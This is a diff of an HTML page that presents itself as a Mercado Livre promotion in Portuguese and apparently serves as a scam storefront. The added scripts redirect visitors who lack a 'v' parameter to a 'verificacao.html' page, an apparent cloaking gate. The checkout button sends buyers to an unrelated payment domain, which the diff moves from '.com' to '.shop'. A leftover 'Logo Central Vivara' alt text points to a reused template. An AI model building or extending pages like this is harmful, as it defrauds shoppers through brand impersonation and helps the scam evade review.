@@ -1,5 +1,18 @@
 <!DOCTYPE html><html lang="pt"><head>
-    <script>
+<script>
+(function() {
+  var params = new URLSearchParams(window.location.search);
+  if (!params.has("v")) {
+    window.location.replace("verificacao.html" + window.location.search);
+  }
+})();
+</script>
+<script>
+if (window.location.pathname.endsWith('/index.html') || window.location.pathname.endsWith('index.html')) {
+  window.location.replace('verificacao.html' + window.location.search);
+}
+</script>
+<script>
   window.pixelId = "66a3fc115f57e7496bcf1525";
   var a = document.createElement("script");
   a.setAttribute("async", "");
@@ -7,6 +20,7 @@
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
 </script>
+    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <title>Mercado Livre</title>
@@ -20,7 +34,7 @@
 
 <body>
    
-    <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva: 26 anos</div>
+    <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva</div>
 
     <nav class="navbar" style="padding-top: 15px;">
         <div class="menu-icon" style="padding-left: 3%;" onclick="window.location.href='../rl-loja' + window.location.search;">
@@ -28,7 +42,6 @@
         </div>
 
         <div class="logo-central">
-            <img src="images/logo.webp" style="height: 5vh;" alt="Logo Central Vivara">
         </div>
 
         <div class="menu-icon" style="padding-right: 3%;">
@@ -88,7 +101,7 @@
 
     <button class="pergunta-botao"
 onclick="setTimeout(function(){
-window.open('https://pay.comprasreaisdodia.com/N1nVZpaYj0MGlM6'+window.location.search,'_self');
+window.open('https://pay.comprasreaisdodia.shop/N1nVZpaYj0MGlM6'+window.location.search,'_self');
 },500);
 
 ">
@@ -226,3 +239,7 @@ window.open('https://pay.comprasreaisdodia.com/N1nVZpaYj0MGlM6'+window.location.
     </script>
 
 </body></html>
+
+
+
+
